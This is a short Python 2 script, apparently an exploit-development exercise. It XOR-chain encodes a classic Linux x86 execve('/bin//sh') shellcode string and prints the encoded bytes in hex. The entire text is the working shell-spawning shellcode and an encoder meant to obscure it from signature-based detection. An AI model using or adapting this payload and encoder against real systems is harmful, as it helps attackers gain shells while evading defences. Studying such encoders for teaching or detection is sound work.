
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc2\x89\xc1\xb0\x0b\xcd\x80"

xor = [0x90]

for i in range(len(shellcode)):
	x = ord(shellcode[i]) ^ xor[i]
	xor.append(x)


del xor[0]
print len(xor)
print ", ".join(hex(c) for c in xor)

